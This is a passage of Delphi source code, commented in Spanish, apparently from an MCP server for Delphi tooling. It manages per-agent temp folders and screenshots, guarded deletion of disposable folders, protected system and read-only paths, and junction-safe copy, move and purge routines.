    // a medias no se queda: un .tmp suelto no lo ve nadie para borrarlo
    System.SysUtils.DeleteFile(Tmp);
    raise;
  end;
  if not MoveFileEx(PChar(Tmp), PChar(AFichero), MOVEFILE_REPLACE_EXISTING) then
  begin
    Err := GetLastError;
    System.SysUtils.DeleteFile(Tmp);
    if not FileExists(AFichero) then
      RaiseLastOSError(Err);
  end;
end;

{ El workspace de quien llama. Con varias raices manda la PRIMERA
  ESCRIBIBLE - una raiz declarada entera en ReadOnlyPaths (el clon de
  referencia) no recibe entregables: seria escribir justo donde nuestra
  propia jaula lo prohibe, y la misma ruta pasada a mano en "out" se
  rechaza (auditoria 2026-09-21). Sin ninguna raiz configurada, o ninguna
  escribible, no hay workspace donde dejar nada y se cae a la casa del
  servidor, que siempre existe. La subcarpeta del agente sale de la misma
  identidad que usa el modo confinado, asi que dos agentes en la misma
  jaula no se pisan - y cuando no hay identidad (stdio, la consola del
  operador) no se inventa una. }
function IsAgentCapture(const APath: string): Boolean;
var
  Full: string;
begin
  Result := False;
  try
    Full := TPath.GetFullPath(APath);
  except
    Exit;
  end;
  Result := SameText(TPath.GetExtension(Full), '.png') and
    EnTemporal(Full) and
    MatchText(TPath.GetFileName(TPath.GetDirectoryName(Full)),
      [CAPTURE_SUB_DESKTOP, CAPTURE_SUB_ANDROID]);
end;

function CapturaConsumible(const APath: string): Boolean;
var
  Real, Casa: string;
begin
  Result := False;
  if not IsAgentCapture(APath) then
    Exit;
  // Nuestra por el NOMBRADOR, no por la puerta: bajo el __delphi-temp de una
  // raiz ESCRIBIBLE de este workspace (el escritor elige la primera; el lector
  // acepta cualquiera: un workspace con las raices en otro orden dejo la suya
  // en la segunda) o bajo la temporal de la casa del servidor, por la ruta
  // real. Una referencia no lo es (solo raices escribibles), un enlace tampoco
  // (RealPath), y el confinamiento no pinta nada: es la carpeta que el propio
  // nombrador dio a los agentes de esta jaula.
  try
    Real := IncludeTrailingPathDelimiter(RealPath(APath));
    for Casa in CasasDeEntregables + [ServerTempDir('')] do
      if StartsText(IncludeTrailingPathDelimiter(RealPath(Casa)), Real) then
        Exit(True);
  except
    Result := False;
  end;
end;

function ConsumeAgentCapture(const APath: string): Boolean;
begin
  // Consumir es BORRAR: el nombre no basta. Lo llaman lectores (delphi_fetch,
  // la descarga, la imagen en linea), y una referencia con una carpeta de
  // capturas perdia sus ficheros al leerlos (auditoria 25-sep-2026).
  Result := False;
  if not CapturaConsumible(APath) then
    Exit;
  try
    if TFile.Exists(APath) then
    begin
      TFile.Delete(APath);
      Result := True;
    end;
  except
    // recoger no puede fallar por no poder borrar
  end;
end;

function CasasDeEntregables: TArray<string>;
var
  R, Ro: string;
  SoloLectura: Boolean;
begin
  Result := [];
  for R in WorkspaceRoots do
  begin
    SoloLectura := False;
    for Ro in WorkspaceReadOnlyPaths do
      if StartsText(Ro, IncludeTrailingPathDelimiter(R)) then
        SoloLectura := True;
    if ReadOnlyRootOf(R) <> '' then // raiz dentro de una referencia: manda la referencia
      SoloLectura := True;
    if not SoloLectura then
      Result := Result + [TPath.Combine(SinBarraFinal(R), TempFolderName)];
  end;
end;

function CasaDeEntregables(out AEnElServidor: Boolean): string;
var
  Casas: TArray<string>;
begin
  Casas := CasasDeEntregables;
  AEnElServidor := Length(Casas) = 0;
  if AEnElServidor then
    Result := ServerTempDir('')
  else
    Result := Casas[0];
end;

function AgentTempDir(const ASub: string): string;
var
  Me: string;
  EnElServidor: Boolean;
begin
  Result := CasaDeEntregables(EnElServidor);
  if EnElServidor then
    Exit(ServerTempDir(ASub)); // en la casa del servidor no hay carpeta por agente
  // El vaciado NO se hace aqui: se hace entero en el arranque, para todos
  // los workspaces del settings.ini (PurgeServerTemp). Hacerlo en el primer
  // uso se probo y no cumplia lo prometido - si nadie pedia un entregable,
  // nadie limpiaba. Y ademas seria peligroso a mitad de sesion: se llevaria
  // por delante la captura que otro agente acaba de pedir y aun no se ha
  // bajado.
  Me := CurrentAgent;
  if Me <> '' then
    Result := TPath.Combine(Result, Me);
  if ASub <> '' then
    Result := TPath.Combine(Result, ASub);
end;

function CaptureTarget(const AOut, ASub, APrefix, AExt: string;
  out AFile: string): string;
var
  O, Carpeta, Ext: string;
begin
  Result := '';
  AFile := '';
  O := AOut.Trim;
  Carpeta := '';
  if O = '' then
    Carpeta := AgentTempDir(ASub)
  else if O.EndsWith('\') or O.EndsWith('/') or TDirectory.Exists(O) then
    Carpeta := SinBarraFinal(O)
  else
  begin
    Ext := TPath.GetExtension(O);
    if Ext = '' then
      Carpeta := O
    else if SameText(Ext, AExt) then
      AFile := O
    else
      Exit(MsgFmt(SR_CAPTURE_EXT_FMT, [AExt, Ext]));
  end;
  if AFile = '' then
    // Milisegundos y un fragmento GUID: con resolucion de SEGUNDOS dos
    // capturas del mismo segundo compartian nombre y la segunda pisaba a la
    // primera - las dos llamadas se llevaban la misma imagen.
    AFile := TPath.Combine(Carpeta, Format('%s-%s%s', [APrefix, SelloUnico, AExt]));
  if O <> '' then
  begin
    // la puerta de ESCRIBIR, la de todas (solo lectura incluida): una sesion
    // de solo lectura pisaba un .png con out= (tercera revision)
    Result := EscrituraDenegada(AFile);
    if Result = '' then
      Result := WriteTargetDenied(AFile);
    // Una captura no se guarda en los temporales del servidor: 90 capturas y
    // 66 MB de Hermes en una __delphi-temp anidada que la purga del arranque
    // no alcanza (25-sep-2026). Se omite out y llega en la respuesta (David:
    // 'no queremos acumular capturas, se entregan en una sola llamada y se
    // borran').
    if (Result <> '') and (DeadCopyWriteDenied(AFile) <> '') then
      Result := Result + ' ' + MsgText(SN_CAPTURE_OUT_TEMP_HINT);
  end;
end;

{ El unico borrador de arboles del servidor (la nota larga, en el
  interface). El bit de reparse se mira ANTES de entrar: el enlace cae,
  el destino ni se mira. }
procedure BorraArbolDentro(const ADir: string);
var
  E: string;
  A: Cardinal;
begin
  A := GetFileAttributes(PChar(ADir));
  if A = INVALID_FILE_ATTRIBUTES then
    Exit; // no esta: nada que borrar
  if EsEnlace(ADir) then
  begin
    // RemoveDir sobre un junction/symlink de directorio elimina el punto
    // de reanalisis y jamas toca lo que hay al otro lado.
    SetFileAttributes(PChar(ADir), FILE_ATTRIBUTE_NORMAL);
    if not RemoveDir(ADir) then
      RaiseLastOSError;
    Exit;
  end;
  // La RTL limpiaba atributos antes de borrar (los objetos de un .git
  // vienen de solo lectura); se conserva ese contrato. Por la API y no por
  // TFile.SetAttributes: esa valida que la ruta sea un FICHERO y sobre un
  // directorio lanza "file not found" - lo cazaron round13 y round44 en la
  // primera pasada de la suite (2026-09-21).
  for E in TDirectory.GetFiles(ADir) do
  begin
    SetFileAttributes(PChar(E), FILE_ATTRIBUTE_NORMAL);
    TFile.Delete(E);
  end;
  for E in TDirectory.GetDirectories(ADir) do
    BorraArbolDentro(E);
  SetFileAttributes(PChar(ADir), FILE_ATTRIBUTE_NORMAL);
  TDirectory.Delete(ADir, False);
end;

function CarpetasDesechables: TArray<string>;
begin
  Result := [TempFolderName, TrashFolderName];
end;

function FragmentoUnico: string;
begin
  Result := LowerCase(TGUID.NewGuid.ToString.Substring(1, 8));
end;

function SelloUnico: string;
begin
  Result := FormatDateTime('yyyymmdd"-"hhnnsszzz', Now) + '-' + FragmentoUnico;
end;

const
  DESCARGA_PREFIJO = '__tmp-'; // empieza por __, como toda zona borrable

function NuevaCarpetaDescarga(const ADentroDe: string): string;
begin
  Result := TPath.Combine(ADentroDe, DESCARGA_PREFIJO + FragmentoUnico);
end;

function EsCarpetaDescarga(const ANombre: string): Boolean;
begin
  // la inversa exacta del nombrador: el prefijo y 8 hexadecimales
  Result := TRegEx.IsMatch(ANombre, '^' + TRegEx.Escape(DESCARGA_PREFIJO) +
    FRAGMENTO_UNICO_PATRON + '$', [roIgnoreCase]);
end;

function Slug(const S: string): string;
var
  C, Prev: Char;
begin
  Result := '';
  Prev := '-';
  for C in S do
  begin
    if CharInSet(C, ['A'..'Z', 'a'..'z', '0'..'9']) then
    begin
      Result := Result + C;
      Prev := C;
    end
    else if Prev <> '-' then
    begin
      Result := Result + '-';
      Prev := '-';
    end;
    if Length(Result) >= 40 then
      Break;
  end;
  Result := Result.Trim(['-']).ToLower;
end;

{ Lo que no se toca de NINGUN workspace: sus referencias, sus ReadOnlyPaths
  y sus vaults (y los del modo local). UNA lista para la purga del arranque
  y para los lugares protegidos: la purga protegia solo lo del workspace
  que recorria y el vault global, y vacio el __delphi-temp del vault de un
  workspace y el de las ReadOnlyPaths de OTRO anidadas en su raiz
  (septima revision, medido). }
function SitiosQueNoSeTocan: TArray<string>;
var
  W: TWorkspaceDef;
begin
  LoadSecurity;
  Result := GRoRoots + GRoPaths + TodosLosVaults;
  for W in GWorkspaces do
    Result := Result + W.ReadOnlyRoots + W.ReadOnlyPaths;
end;

function LugaresProtegidos: TArray<string>;
var
  W: TWorkspaceDef;
begin
  LoadSecurity;
  Result := GRoots + SitiosQueNoSeTocan + [ExtractFileDir(ParamStr(0)),
    GetEnvironmentVariable('WINDIR'), GetEnvironmentVariable('ProgramFiles'),
    GetEnvironmentVariable('ProgramFiles(x86)'),
    GetEnvironmentVariable('USERPROFILE')];
  for W in GWorkspaces do
    Result := Result + W.Roots;
end;

{ La ruta de un enlace se juzga por DONDE ESTA, no por adonde apunta: la ruta
  REAL del padre + el nombre. Quitar o mover un junction nunca toca lo de
  detras, y un junction en el camino no hace pasar una ruta por otra. }
function RutaDelEnlace(const AFull: string): string;
begin
  // el ultimo tramo en su nombre LARGO: tal como lo escribia el agente,
  // OTHERW~1 no era la raiz de otro workspace y se borraba (sexta
  // revision). GetLongPathName no atraviesa el enlace.
  Result := IncludeTrailingPathDelimiter(RealPath(ExtractFileDir(AFull))) +
    ExtractFileName(LongCanonical(AFull));
end;

{ El lugar protegido (tal como esta declarado) que AReal ES o CONTIENE; ''
  si ninguno. EL comparador: BorradoDenegado y ProtegidoDenegado. }
function LugarProtegidoEn(const AReal: string): string;
var
  P, PReal: string;
begin
  Result := '';
  for P in LugaresProtegidos do
  begin
    if P.Trim = '' then
      Continue;
    PReal := SinBarraFinal(RealPath(P.Trim));
    if StartsText(IncludeTrailingPathDelimiter(AReal), IncludeTrailingPathDelimiter(PReal)) then
      Exit(SinBarraFinal(P.Trim));
  end;
end;

function BorradoDenegado(const ADir: string): string;
var
  Full, Real, Seg, P: string;
  Segs: TArray<string>;
  I: Integer;
  Desechable: Boolean;
begin
  Result := '';
  if (ADir.Trim = '') or not EsRutaAbsoluta(ADir.Trim) then
    Exit(MsgFmt(SR_BORRADO_DENEGADO_FMT, [ADir, MsgText(SF_GUARD_RUTA_VACIA_O_RELATIVA)]));
  try
    Full := SinBarraFinal(TPath.GetFullPath(ADir.Trim));
  except
    Exit(MsgFmt(SR_BORRADO_DENEGADO_FMT, [ADir, MsgText(SF_GUARD_RUTA_INVALIDA)]));
  end;
  if (Length(Full) <= 3) or (Full.StartsWith('\\') and
     (Length(Full.Substring(2).Split(['\'], TStringSplitOptions.ExcludeEmpty)) <= 2)) then
    Exit(MsgFmt(SR_BORRADO_DENEGADO_FMT, [ADir, MsgText(SF_GUARD_UNIDAD_O_RECURSO_ENTERO)]));
  // la ruta REAL del padre + el nombre (ver la nota de la interface)
  Real := RutaDelEnlace(Full);
  // (1) lista blanca
  Segs := Real.Split(['\', '/'], TStringSplitOptions.ExcludeEmpty);
  Desechable := False;
  for I := 0 to High(Segs) do
  begin
    Seg := Segs[I];
    // Tercera barrera (David, 25-sep-2026): el segmento que habilita el
    // borrado EMPIEZA POR __, sea cual sea la lista: una entrada futura con
    // nombre normal, o una ruta mal calculada, no habilita nada.
    if not Seg.StartsWith('__') then
      Continue;
    if (I < High(Segs)) and MatchText(Seg, CarpetasDesechables) then
      Desechable := True // DENTRO de una desechable, nunca la carpeta misma
    else if EsCarpetaDescarga(Seg) then
      Desechable := True;
  end;
  if not Desechable then
    Exit(MsgFmt(SR_BORRADO_DENEGADO_FMT, [ADir,
      MsgFmt(SF_GUARD_NO_DENTRO_DESECHABLE_FMT,
      [string.Join(', ', CarpetasDesechables)])]));
  // (2) lista negra: ni ser ni contener un lugar protegido
  P := LugarProtegidoEn(Real);
  if P <> '' then
    Exit(MsgFmt(SR_BORRADO_DENEGADO_FMT, [ADir, MsgFmt(SF_GUARD_CONTIENE_LUGAR_PROTEGIDO_FMT, [P])]));
end;

function PrimerTrozo(const S: string; const ASeps: array of Char): string;
var
  Partes: TArray<string>;
begin
  Partes := S.Split(ASeps);
  if Length(Partes) = 0 then
    Result := ''
  else
    Result := Partes[0];
end;

{ P es un enlace (junction o symlink, de carpeta o de fichero). }
function EsEnlace(const P: string): Boolean;
var
  A: Cardinal;
begin
  A := GetFileAttributes(PChar(P));
  Result := (A <> INVALID_FILE_ATTRIBUTES) and ((A and FILE_ATTRIBUTE_REPARSE_POINT) <> 0);
end;

procedure RecorreSinEnlaces(const ADir: string; const AVisita: TVisitaRuta;
  const AAlEnlace: TVisitaRuta = nil);
var
  Entradas: TArray<string>;
  E: string;
begin
  try
    Entradas := TDirectory.GetFileSystemEntries(ADir);
  except
    Exit; // una rama ilegible se salta
  end;
  for E in Entradas do
  begin
    if EsEnlace(E) then
    begin
      // ni se visita ni se entra: lo de detras no es de este arbol. Quien
      // necesita saber que esta aqui, lo recibe.
      if Assigned(AAlEnlace) then
        try
          AAlEnlace(E);
        except
        end;
      Continue;
    end;
    try
      AVisita(E);
    except
      // una entrada que no se deja tocar no para las demas
    end;
    if TDirectory.Exists(E) then
      RecorreSinEnlaces(E, AVisita, AAlEnlace);
  end;
end;

{ LA regla de enlaces de la copia: se sigue solo si lo de detras se puede
  LEER en esta sesion. Dos veredictos de la MISMA puerta de lectura: el
  destino real (una referencia, la zona de biblioteca) o el camino por el
  enlace (un enlace a tus propias raices). Ninguno abre nada que no se lea
  ya. La usan CopiaArbol y CopiaDenegada: lo que se mira es lo que se copia. }
function EnlaceLegible(const P: string): Boolean;
begin
  Result := (ReadPathDenied(RealPath(P)) = '') or (ReadPathDenied(P) = '');
end;

{ Recursive file walk that TOLERATES unreadable subdirectories. Delphi's
  TDirectory.GetFiles(soAllDirectories) aborts the WHOLE enumeration on the
  first failure - measured on the Android NDK, whose deep paths exceed the
  classic limit and killed an entire delphi_list. One bad folder must never
  hide the rest of the tree. }
function WalkFiles(const ADir: string; const AMasks: TArray<string>;
  AConPapelera: Boolean): TArray<string>;
var
  Acc: TStringList;
  Vistos: TStringList; // rutas REALES de los enlaces ya seguidos: corta ciclos
  // Cada fichero UNA vez: dos mascaras que se solapan ("*;*.pas") o la
  // pasada de la papelera (mascara + '-*', que "*" ya cubre) lo contaban dos
  // veces - total 7 para 3 ficheros (quinta revision). Acc guarda el orden
  // del paseo; esto solo responde "ya esta", en O(1): un arbol como el NDK
  // tiene decenas de miles de ficheros.
  Unicos: TDictionary<string, Boolean>;

  procedure Anade(const F: string);
  begin
    if not Unicos.ContainsKey(LowerCase(F)) then
    begin
      Unicos.Add(LowerCase(F), True);
      Acc.Add(F);
    end;
  end;

  procedure Recurse(const D: string);
  var
    F, Sub: string;
  begin
    try
      // Un enlace (de fichero o de carpeta) se sigue solo si lo de detras se
      // puede LEER: EnlaceLegible, la regla del copiador. Un junction a
      // cualquier sitio ensenaba, buscaba y empaquetaba lo que la puerta de
      // lectura no deja leer (auditoria 25-sep-2026).
      for var Mascara in AMasks do
        for F in TDirectory.GetFiles(D, Mascara, TSearchOption.soTopDirectoryOnly) do
          if not EsEnlace(F) or EnlaceLegible(F) then
            Anade(F);
    except
      // unreadable folder: skip its files, still try its children
    end;
    // Dentro de la papelera cada copia lleva el sello de hora DETRAS de la
    // extension ("UFicha.pas-215825250"), asi que la mascara "*.pas" no casa
    // con ella. Resultado medido el 2026-09-20: includetrash=true ensenaba
    // las copias de seguridad -que SI conservan su nombre- y escondia justo
    // lo BORRADO, que es lo unico que ese flag promete. La mascara se abre
    // solo aqui y solo cuando lo piden: los demas que llaman no se enteran.
    if AConPapelera and EnPapelera(D) then
    try
      for var Mascara in AMasks do
        for F in TDirectory.GetFiles(D, Mascara + '-*',
          TSearchOption.soTopDirectoryOnly) do
          if not EsMarcaDeDueno(F) and (not EsEnlace(F) or EnlaceLegible(F)) then
            Anade(F);
    except
      // idem
    end;
    try
      for Sub in TDirectory.GetDirectories(D) do
      begin
        if EsEnlace(Sub) then
        begin
          if not EnlaceLegible(Sub) then
            Continue;
          var RealSub := LowerCase(RealPath(Sub));
          if Vistos.IndexOf(RealSub) >= 0 then
            Continue; // un ciclo de enlaces
          Vistos.Add(RealSub);
        end;
        // La papelera se purga solo despues de admitir la lectura del enlace.
        if SameText(TPath.GetFileName(Sub), TrashFolderName) then
          PurgaAlPasar(Sub);
        Recurse(Sub);
      end;
    except
      // cannot enumerate children: nothing else to do here
    end;
  end;

begin
  if ReadPathDenied(ADir) <> '' then
    Exit(nil);
  Acc := TStringList.Create;
  Vistos := TStringList.Create;
  Unicos := TDictionary<string, Boolean>.Create;
  try
    Vistos.Sorted := True;
    Vistos.Add(LowerCase(RealPath(ADir)));
    Recurse(ADir);
    Result := Acc.ToStringArray;
  finally
    Unicos.Free;
    Vistos.Free;
    Acc.Free;
  end;
end;

function WalkFiles(const ADir, AMask: string;
  AConPapelera: Boolean): TArray<string>;
begin
  Result := WalkFiles(ADir, [AMask], AConPapelera);
end;

{ ADestino cae DENTRO de AOrigen (o es el), por las rutas REALES. Con
  AOrigenEsElEnlace, el origen por SU ruta (RutaDelEnlace), no la de detras:
  un MOVE renombra el enlace mismo, y por su destino una junction a un
  antepasado caia "dentro de si misma" y no se podia ni borrar ni mover
  (septima revision). Una copia lee a traves del enlace: la real. }
function RutaParaComparar(const ARuta: string; AEsElEnlace: Boolean = False): string;
begin
  if AEsElEnlace then
    Result := RutaDelEnlace(SinBarraFinal(TPath.GetFullPath(ARuta)))
  else
    Result := RealPath(SinBarraFinal(ARuta));
  Result := IncludeTrailingPathDelimiter(Result);
end;

function CaeDentro(const AOrigenResuelto, ADestinoResuelto: string): Boolean;
begin
  Result := StartsText(AOrigenResuelto, ADestinoResuelto);
end;

function DentroDeSiMismo(const AOrigen, ADestino: string;
  AOrigenEsElEnlace: Boolean = False): Boolean;
begin
  Result := CaeDentro(RutaParaComparar(AOrigen, AOrigenEsElEnlace),
    RutaParaComparar(ADestino));
end;

{ LA regla de seguir un enlace al COPIAR, para el copiador (CopiaArbol) y
  para quien mira antes lo que se va a copiar (CopiaDenegada): legible, y que
  no lleve al DESTINO - una junction a un antepasado del destino copiaba la
  copia dentro de si misma, con una ruta real nueva en cada vuelta, hasta
  agotar la ruta (decima revision). }
function SeSigueAlCopiar(const P, ADestino: string): Boolean;
begin
  // el enlace RESUELTO (RealPath: lo que hay detras), no su propio nombre
  Result := EnlaceLegible(P) and not DentroDeSiMismo(P, ADestino);
end;

procedure CopiaArbol(const AOrigen, ADestino: string; AConPapelera: Boolean;
  out ANoSeguidos: TArray<string>; ASigueEnlaces: Boolean;
  const AOmite: TOmiteAlCopiar);
var
  Vistos: TStringList;
  NoSeg: TStringList;

  function SeSigue(const P: string): Boolean;
  begin
    Result := ASigueEnlaces and SeSigueAlCopiar(P, ADestino);
    if not Result then
      NoSeg.Add(P);
  end;

  procedure Copia(const O, D: string);
  var
    E, Nombre: string;
  begin
    // la ruta REAL ya copiada no se vuelve a copiar: corta un bucle de enlaces
    if Vistos.IndexOf(LowerCase(RealPath(O))) >= 0 then
      Exit;
    Vistos.Add(LowerCase(RealPath(O)));
    CrearCarpeta(D);
    for E in TDirectory.GetFiles(O) do
      if (not EsEnlace(E) or SeSigue(E)) and
         (not Assigned(AOmite) or not AOmite(E)) then
        // la copia CON papelera es la de seguridad de un move (conserva los
        // atributos); la otra es la del agente (copy=true): sin el +R heredado
        if AConPapelera then
          TFile.Copy(E, TPath.Combine(D, TPath.GetFileName(E)), False)
        else
          CopiaNuestra(E, TPath.Combine(D, TPath.GetFileName(E)));
    for E in TDirectory.GetDirectories(O) do
    begin
      Nombre := TPath.GetFileName(E);
      if not AConPapelera and SameText(Nombre, TrashFolderName) then
        Continue; // la papelera del origen no es contenido
      // un VAULT (de cualquier workspace) es de las tools vault_*: no se
      // copia, y se dice con lo no seguido (el de OTRO workspace salia
      // entero en la copia; octava revision)
      if InVault(E) then
      begin
        NoSeg.Add(E);
        Continue;
      end;
      if (not EsEnlace(E) or SeSigue(E)) and
         (not Assigned(AOmite) or not AOmite(E)) then
        Copia(E, TPath.Combine(D, Nombre));
    end;
  end;

begin
  // Dentro de si misma se copiaria sin fin: el destino recien creado sale
  // en el listado del origen, con una ruta real nueva en cada vuelta.
  if DentroDeSiMismo(AOrigen, ADestino) then
    raise Exception.Create(MsgFmt(SR_COPIA_DENTRO_DE_SI_FMT, [ADestino, AOrigen]));
  Vistos := TStringList.Create;
  NoSeg := TStringList.Create;
  try
    Vistos.Sorted := True;
    Copia(SinBarraFinal(AOrigen), SinBarraFinal(ADestino));
    ANoSeguidos := NoSeg.ToStringArray;
  finally
    NoSeg.Free;
    Vistos.Free;
  end;
end;

function CopiaDenegada(const AOrigen, ADestino: string): string;
var
  Vistos: TStringList;
  Hallado: string;

  function EsProyecto(const F: string): Boolean;
  begin
    Result := MatchText(TPath.GetExtension(F), ['.dproj', '.dpk', '.dpr']);
  end;

  procedure Busca(const O: string);
  var
    E: string;
  begin
    if (Hallado <> '') or (Vistos.IndexOf(LowerCase(RealPath(O))) >= 0) then
      Exit;
    Vistos.Add(LowerCase(RealPath(O)));
    for E in TDirectory.GetFiles(O) do
      if EsProyecto(E) and (not EsEnlace(E) or SeSigueAlCopiar(E, ADestino)) then
      begin
        Hallado := E;
        Exit;
      end;
    for E in TDirectory.GetDirectories(O) do
      if not SameText(TPath.GetFileName(E), TrashFolderName) and
         (not EsEnlace(E) or SeSigueAlCopiar(E, ADestino)) then
        Busca(E);
  end;

begin
  if DentroDeSiMismo(AOrigen, ADestino) then
    Exit(MsgFmt(SR_COPIA_DENTRO_DE_SI_FMT, [ADestino, AOrigen]));
  Hallado := '';
  if TFile.Exists(AOrigen) then
  begin
    if EsProyecto(AOrigen) then
      Hallado := AOrigen;
  end
  else if TDirectory.Exists(AOrigen) then
  begin
    Vistos := TStringList.Create;
    try
      Vistos.Sorted := True;
      Busca(SinBarraFinal(AOrigen));
    finally
      Vistos.Free;
    end;
  end;
  if Hallado <> '' then
    Result := MsgFmt(SR_MOVE_COPY_PROJECT_FMT, [Hallado])
  else
    Result := '';
end;

procedure BorraArbol(const ADir: string);
var
  Motivo: string;
begin
  // El guard ANTES de tocar nada, y una sola vez: los hijos de algo aprobado
  // estan dentro de ello (misma lista blanca) y si hubiera un lugar
  // protegido debajo, el padre ya lo CONTENDRIA y se habria denegado.
  Motivo := BorradoDenegado(ADir);
  if Motivo <> '' then
    raise Exception.Create(Motivo);
  // ...y lo NUESTRO, fuera, como en MueveArbol: con un DelphiLSP vivo en la
  // carpeta se borraba el contenido y quedaba el cascaron (29-sep-2026)
  SueltaLoNuestroBajo(ADir);
  try
    BorraArbolDentro(ADir);
  finally
    YaNoSeQuita(ADir);
  end;
end;

function ProtegidoDenegado(const ADir: string): string;
var
  Full, P: string;
begin
  Result := '';
  try
    Full := SinBarraFinal(TPath.GetFullPath(ADir.Trim));
  except
    Exit; // una ruta que no parsea es cosa de PathDenied
  end;
  P := LugarProtegidoEn(RutaDelEnlace(Full));
  if P = '' then
    Exit;
  // se nombra solo lo que esta sesion ya puede leer (la nota, en la interface)
  if ReadPathDenied(P) = '' then
    P := '"' + P + '"'
  else
    P := MsgText(SN_LUGAR_PROTEGIDO);
  Result := MsgFmt(SR_MUDANZA_PROTEGIDA_FMT, [ADir, P]);
end;

function MovidoDenegado(const AOrigen, ADestino: string): string;
var
  UO, UD: string;
begin
  Result := PathDenied(AOrigen);
  if Result <> '' then
    Exit;
  Result := PathDenied(ADestino);
  if Result <> '' then
    Exit;
  Result := ProtegidoDenegado(AOrigen);
  if Result <> '' then
    Exit;
  if DentroDeSiMismo(AOrigen, ADestino, True) then
    Exit(MsgFmt(SR_COPIA_DENTRO_DE_SI_FMT, [ADestino, AOrigen]));
  // la unidad REAL de cada lado: un junction en el camino no la disfraza
  try
    UO := ExtractFileDrive(RutaDelEnlace(SinBarraFinal(
      TPath.GetFullPath(AOrigen))));
    UD := ExtractFileDrive(RealPath(ADestino));
  except
    Exit(MsgFmt(SR_GUARD_RUTA_INVALIDA_FMT, [AOrigen]));
  end;
  if not SameText(UO, UD) then
    Result := MsgFmt(SR_MUDANZA_OTRA_UNIDAD_FMT, [AOrigen, ADestino]);
end;

var
  GSoltadores: TArray<TSoltadorDeCarpeta>;

procedure RegistraSoltadorDeCarpeta(ASoltador: TSoltadorDeCarpeta);
begin
  if not Assigned(ASoltador) then
    Exit;
  SetLength(GSoltadores, Length(GSoltadores) + 1);
  GSoltadores[High(GSoltadores)] := ASoltador;
end;

procedure AvisaALosSoltadores(const ACarpeta: string; AEmpieza: Boolean);
var
  I: Integer;
begin
  for I := 0 to High(GSoltadores) do
    try
      GSoltadores[I](ACarpeta, AEmpieza);
    except
      // lo que no se suelte deja fallar la mudanza, entera, como antes
    end;
end;

procedure SueltaLoNuestroBajo(const ACarpeta: string);
begin
  AvisaALosSoltadores(ACarpeta, True);
end;

procedure YaNoSeQuita(const ACarpeta: string);
begin
  AvisaALosSoltadores(ACarpeta, False);
end;

procedure MueveArbol(const AOrigen, ADestino: string);
var
  Motivo: string;
begin
  // El guard ANTES de tocar nada, como en BorraArbol.
  Motivo := MovidoDenegado(AOrigen, ADestino);
  if Motivo <> '' then
    raise Exception.Create(Motivo);
  // ...y lo NUESTRO, fuera: una mudanza que el guard niega no suelta nada
  SueltaLoNuestroBajo(AOrigen);
  try
  // MoveFile a secas: ni MOVEFILE_COPY_ALLOWED ni TDirectory.Move. En la
  // misma unidad renombra de un golpe; si no puede, devuelve False sin
  // haber tocado nada. Entre unidades falla con ERROR_NOT_SAME_DEVICE: el
  // mismo rechazo, por si la unidad llego disfrazada (un punto de montaje).
  if not MoveFile(PChar(SinBarraFinal(AOrigen)),
       PChar(SinBarraFinal(ADestino))) then
  begin
    if GetLastError = ERROR_NOT_SAME_DEVICE then
      raise Exception.Create(MsgFmt(SR_MUDANZA_OTRA_UNIDAD_FMT, [AOrigen, ADestino]));
    RaiseLastOSError;
  end;
  finally
    YaNoSeQuita(AOrigen);
  end;
end;

function CorteDePurga(AHoras: Integer): UInt64;
var
  FT: TFileTime;
begin
  GetSystemTimeAsFileTime(FT);
  Result := (UInt64(FT.dwHighDateTime) shl 32) or FT.dwLowDateTime;
  Result := Result - UInt64(AHoras) * 36000000000; // 1 h en unidades de 100 ns
end;

{ True si AEntrada - un fichero, o una carpeta con todo lo de debajo, sin
  cruzar enlaces - tiene algo creado o escrito desde ACorte. En la duda (no
  se puede mirar), True: lo que no se sabe viejo no se borra. }
function TieneAlgoDesde(const AEntrada: string; ACorte: UInt64): Boolean;
var
  FD: TWin32FileAttributeData;
  E: string;

  function Momento(const F: TFileTime): UInt64;
  begin
    Result := (UInt64(F.dwHighDateTime) shl 32) or F.dwLowDateTime;
  end;

begin
  if not GetFileAttributesEx(PChar(AEntrada), GetFileExInfoStandard, @FD) then
    Exit(True);
  if (Momento(FD.ftLastWriteTime) >= ACorte) or (Momento(FD.ftCreationTime) >= ACorte) then
    Exit(True);
  if (FD.dwFileAttributes and FILE_ATTRIBUTE_DIRECTORY = 0) or EsEnlace(AEntrada) then
    Exit(False); // un fichero, o un enlace: lo de detras no se mira
  Result := False;
  try
    for E in TDirectory.GetFileSystemEntries(AEntrada) do
      if TieneAlgoDesde(E, ACorte) then
        Exit(True);
  except
    Result := True;
  end;
end;

{ (la nota, en la interface) Nunca lanza: no poder tirar un temporal no es
  motivo para que falle lo que lo pedia. }
procedure VaciaDesechable(const ADir: string; ACorte: UInt64);
var
  E: string;
begin
  // El guard del unico que vacia (David, 25-sep-2026): solo una carpeta de la
  // lista central de desechables, y con el __ delante. Una ruta mal
  // calculada nunca vacia otra cosa.
  var Nombre := TPath.GetFileName(SinBarraFinal(ADir));
  if not (Nombre.StartsWith('__') and MatchText(Nombre, CarpetasDesechables)) then
    Exit;
  // ...y si la propia temporal es un ENLACE, lo de detras no es nuestro:
  // enumerarla seria vaciar el destino (25-sep-2026).
  if EsEnlace(SinBarraFinal(ADir)) then
    Exit;
  try
    if not TDirectory.Exists(ADir) then
      Exit;
    for E in TDirectory.GetFiles(ADir) do
      try
        if (ACorte = 0) or not TieneAlgoDesde(E, ACorte) then
          TFile.Delete(E);
      except
      end;
    for E in TDirectory.GetDirectories(ADir) do
      try
        if (ACorte = 0) or not TieneAlgoDesde(E, ACorte) then
          BorraArbol(E);
      except
      end;
  except
  end;
end;

var
  GPrimera: THandle = 0;
  GPresencia: THandle = 0; // ApuntaPresencia: esta instancia, viva
  GTemporalesMias: TStringList = nil; // claves de las temporales de ESTE proceso

{ Reclama AClave para ESTE proceso mientras viva: un mutex global que se
  queda abierto de por vida. False si otro proceso vivo ya la tiene, o si
  no se pudo crear (otra cuenta, otro fallo): en la duda no es nuestra, y
  no purgar es la opcion sin peligro. LA regla de "de quien es esto
  mientras vive": la usan la casa del servidor y las temporales de raiz. }
function NombreDeMutex(const AClave: string): string;
begin
  Result := 'Global\DelphiLspMcp-' + AClave;
end;

function ReclamaNombre(const AClave: string; out AHandle: THandle): Boolean;
begin
  AHandle := CreateMutex(nil, False, PChar(NombreDeMutex(AClave)));
  if (AHandle <> 0) and (GetLastError = ERROR_ALREADY_EXISTS) then
  begin
    CloseHandle(AHandle);
    AHandle := 0;
  end;
  Result := AHandle <> 0;
end;

function ClaveDeCarpeta(const ADir: string): string;
begin
